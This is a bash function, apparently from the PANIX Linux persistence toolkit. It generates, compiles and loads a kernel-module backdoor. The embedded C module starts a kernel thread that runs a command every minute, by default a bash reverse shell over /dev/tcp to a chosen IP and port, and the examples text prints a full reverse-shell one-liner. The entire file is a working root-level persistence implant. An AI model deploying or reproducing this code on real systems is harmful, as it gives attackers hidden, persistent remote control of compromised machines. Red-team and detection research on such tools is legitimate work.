setup_lkm_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local lkm_compile_dir="/tmp/lkm"
	local lkm_name="panix"
	local lkm_source="${lkm_compile_dir}/${lkm_name}.c"
	local lkm_destination="/lib/modules/$(uname -r)/kernel/drivers/${lkm_name}.ko"
	local lkm_path=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_lkm_backdoor() {
		echo "Usage: ./panix.sh --lkm [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default LKM settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom LKM settings"
		echo "  --path <path>                Specify custom kernel module path"
		echo "  --command <command>          Specify custom command to add to LKM"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			--path )
				shift
				lkm_path=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --lkm --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --lkm --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/lib/modules/$(uname -r)/kernel/drivers/custom_lkm.ko\""
				exit 0
				;;
			--help|-h)
				usage_lkm_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --lkm: $1"
				echo "Try './panix.sh --lkm --help' for more information."
				exit 1
		esac
		shift
	done

	if ! command -v make &> /dev/null; then
		echo "Error: 'make' is not installed. Please install 'make' or 'build-essential' to use this mechanism."
		echo "For Debian/Ubuntu: sudo apt install build-essential"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install make"
		exit 1
	fi

	if ! command -v gcc &> /dev/null; then
		echo "Error: 'gcc' is not installed. Please install 'gcc' to use this mechanism."
		echo "For Debian/Ubuntu: sudo apt install gcc"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install gcc"
		exit 1
	fi

	KERNEL_HEADERS="/lib/modules/$(uname -r)/build"
	RESOLVED_HEADERS=$(readlink -f "$KERNEL_HEADERS")

	if [ ! -d "$RESOLVED_HEADERS" ]; then
		echo "Kernel headers not found. Please install the kernel headers for your system."
		echo "For Debian/Ubuntu: sudo apt install linux-headers-\$(uname -r)"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install kernel-devel"
		exit 1
	fi

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --lkm --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --lkm --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --lkm --help' for more information."
			exit 1
		fi

		# Populate the command for default mode
		# Ensure proper escaping for C string
		command="\"/bin/bash\",\"-c\",\"/bin/nohup /bin/setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/$ip/$port 0>&1'\",NULL"
		echo "Default mode selected. Command set to reverse shell."

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $lkm_path ]]; then
			echo "Error: --command and --path must be specified when using --custom."
			echo "Try './panix.sh --lkm --help' for more information."
			exit 1
		fi

		# Populate the command for custom mode
		# Ensure proper escaping for C string
		command="\"/bin/bash\",\"-c\",\"$command\",NULL"
		lkm_destination="$lkm_path"
		echo "Custom mode selected. Command set to user-provided command."
	fi

	cat <<-EOF > ${lkm_source}
	#include <linux/module.h>
	#include <linux/kernel.h>
	#include <linux/init.h>
	#include <linux/kthread.h>
	#include <linux/delay.h>
	#include <linux/signal.h>

	static struct task_struct *task;

	static int backdoor_thread(void *arg) {
		allow_signal(SIGKILL);
		while (!kthread_should_stop()) {
			char *argv[] = {$command};
			call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_PROC);
			ssleep(60);
		}
		return 0;
	}

	static int __init lkm_backdoor_init(void) {
		printk(KERN_INFO "Loading LKM backdoor module\\n");
		task = kthread_run(backdoor_thread, NULL, "lkm_backdoor_thread");
		return 0;
	}

	static void __exit lkm_backdoor_exit(void) {
		printk(KERN_INFO "Removing LKM backdoor module\\n");
		if (task) {
			kthread_stop(task);
		}
	}

	module_init(lkm_backdoor_init);
	module_exit(lkm_backdoor_exit);

	MODULE_LICENSE("GPL");
	MODULE_AUTHOR("PANIX");
	MODULE_DESCRIPTION("LKM Backdoor");
	EOF

    # Check if the source file was created
    if [ ! -f "$lkm_source" ]; then
        echo "Failed to create the kernel module source code at $lkm_source"
        exit 1
    else
		echo "Kernel module source code created: $lkm_source"
	fi

	# Create the Makefile
	mkdir -p ${lkm_compile_dir}
cat <<EOF > ${lkm_compile_dir}/Makefile
obj-m += ${lkm_name}.o

all:
	make -C /lib/modules/\$(shell uname -r)/build M=\$(PWD) modules

clean:
	make -C /lib/modules/\$(shell uname -r)/build M=\$(PWD) clean
EOF

    if [ ! -f "${lkm_compile_dir}/Makefile" ]; then
		echo "Failed to create the Makefile at ${lkm_compile_dir}/Makefile"
		exit 1
    else
		echo "Makefile created: ${lkm_compile_dir}/Makefile"
	fi

	# Compile the kernel module using make
	cd ${lkm_compile_dir}
	make

	if [ $? -ne 0 ]; then
		echo "Compilation failed. Exiting."
		exit 1
	fi

	# Copy the compiled module to the destination
	cp ${lkm_compile_dir}/${lkm_name}.ko ${lkm_destination}

	if [ $? -ne 0 ]; then
		echo "Copying module failed. Exiting."
		exit 1
	fi

	echo "Kernel module compiled successfully: ${lkm_destination}"

	sudo insmod ${lkm_destination}
	if [[ $? -ne 0 ]]; then
		echo "Failed to load the kernel module. Check dmesg for errors."
		exit 1
	fi

	echo "Kernel module loaded successfully. Check dmesg for the output."
	echo "[+] LKM backdoor established!"
}
